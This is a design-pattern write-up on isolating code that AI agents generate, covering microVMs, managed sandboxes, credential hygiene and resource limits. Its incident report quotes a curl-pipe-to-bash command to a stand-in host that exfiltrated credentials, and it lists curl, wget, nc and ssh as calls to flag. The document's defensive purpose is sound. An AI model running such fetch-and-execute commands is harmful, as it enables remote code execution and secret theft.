# S-873 · The Sandboxed Code Execution Stack

_You gave your agent the ability to run code. It ran code — just not the kind you expected. Time to isolate it._

## Forces

- **LLM-generated code is untrusted input** — equivalent to code from a stranger on the internet, yet most agents execute it directly on host infrastructure
- **Latency vs. safety tradeoff** — heavyweight VMs are secure but slow; fast execution paths are unsafe
- **Tool ecosystem fragmentation** — Docker, E2B, Modal, Firecracker, gVisor, Kata Containers each solve a different slice of the problem
- **Credential leakage surface** — agents can exfiltrate secrets from the execution environment if isolation is insufficient
- **Operational overhead** — managing sandbox lifecycle, warm pools, and networking adds infrastructure complexity teams underestimate

## The move

Isolate all agent-generated code execution in purpose-built ephemeral environments. Treat the sandbox as a first-class security boundary, not an afterthought.

**Spec the isolation hierarchy:**

- **MicroVMs (Firecracker, gVisor)** for multi-tenant or high-security workloads — near-VM isolation with sub-second startup. Firecracker is what AWS Lambda uses internally; it boots in ~125ms.
- **E2B / Modal** for managed cloud sandboxes with SDK support — fastest time-to-value, built-in tooling for streaming, file mounts, and timeout handling. E2B is purpose-built for AI agents; Modal is general serverless with a strong ML/data fit.
- **Docker (rootless, seccomp, no network)** for self-hosted single-tenant workloads where you control the fleet. Never run containers with `--privileged` or host networking.
- **Kata Containers** when you need VM-level isolation but need to run on shared infrastructure — containers that boot as lightweight VMs.

**Enforce credential hygiene inside the sandbox:**

- Execute with minimal IAM role — no long-lived secrets baked into the image
- Use short-lived credentials or outbound signing (e.g., TengineAI's request signing) so the tool's outbound calls can be verified at the receiving API
- Block outbound network by default; allowlist only the domains the agent needs for its task

**Design the execution layer as infrastructure, not application code:**

```
LLM → tool request → execution layer → sandboxed tool
```

The execution layer (e.g., TengineAI) owns retries, timeouts, permission enforcement, and audit logging. The LLM should never directly trigger application logic.

**Set hard resource limits upfront:**

- CPU time, memory, disk I/O, and wall-clock time limits
- No package installation at runtime (pre-bake a curated environment)
- Read-only filesystem except designated output paths

**Handle the failure modes explicitly:**

- Timeout → report failure to agent with the partial output, do not retry automatically
- OOM / crash → kill and restart clean; don't reuse a degraded container
- Suspicious syscalls (curl, wget, nc, ssh) → terminate and flag for review

## Evidence

- **Production security incident (March 2025):** A code-generation agent executed `os.system("curl https://x.example.com | bash")` from within an unisolated container. The command exfiltrated MinIO credentials to an external host. The root cause: LLM-generated code was treated as trusted application input. — [AgentList: Sandboxing Code Execution in AI Agents](https://www.agentlist.top/en/articles/ai-agent-code-sandbox-microvm-practice/)
- **TengineAI Show HN (2025):** Built specifically to solve the "LLM → direct application code" coupling problem. Proposes treating tools as infrastructure with an execution layer between the LLM and tool execution. Addresses permission boundaries, audit trails, retries, and isolation as first-class concerns. — [Show HN: TengineAI – Infrastructure for running AI tools in production](https://news.ycombinator.com/item?id=47427554)
- **E2B vs Modal vs Docker comparison:** E2B (cloud sandbox, ~5s cold start, managed lifecycle), Modal (serverless containers, fast auto-scaling, good for data/ML tasks), Docker (self-hosted, flexible but requires manual hardening). The decision hinges on whether you need managed infra or full control. — [Code Sandboxes: E2B, Modal, Docker](https://neelmishra.github.io/blog/mlops/llm-agents/code-execution-sandbox.html)
- **Browser-use ecosystem (103k GitHub stars):** The de facto standard for browser automation as a tool for agents. Y Combinator W25, 7-person team, SOC 2 certified. Their "Browser Harness" repo handles self-healing element selection. Demonstrates that agent tool infrastructure is now a product category, not a library. — [browser-use/browser-use](https://github.com/browser-use/browser-use)
- **Agent Browser Protocol (ABP) Show HN:** Forked Chromium specifically for AI agents. Core insight: browser-agent failures stem from stale DOM state between agent action and page render. Solution freezes JS execution and rendering after each action, keeping the agent synchronized with the browser. Achieved 90.5% on Online Mind2Web with Opus 4.6. — [Show HN: Open-source browser for AI agents](https://news.ycombinator.com/item?id=47336171)

## Gotchas

- **"We'll add a firewall rule" is not isolation.** Network-layer filtering alone doesn't stop side-channel attacks or credential exfiltration via DNS or ICMP tunneling. You need process-level isolation.
- **Warm pools help latency but complicate state management.** If you reuse sandboxes across requests, clean the environment between runs — agent-generated code may leave files, env vars, or child processes behind.
- **Sandbox escape via dependency confusion is real.** Pre-baking environments is safer than allowing runtime package installation, but it means your image maintenance burden is now continuous (patch CVEs in your base images regularly).
- **The agent can still produce wrong outputs from correct code.** Sandboxing prevents malicious side effects; it doesn't make the agent's logic sound. You still need eval and output validation upstream.
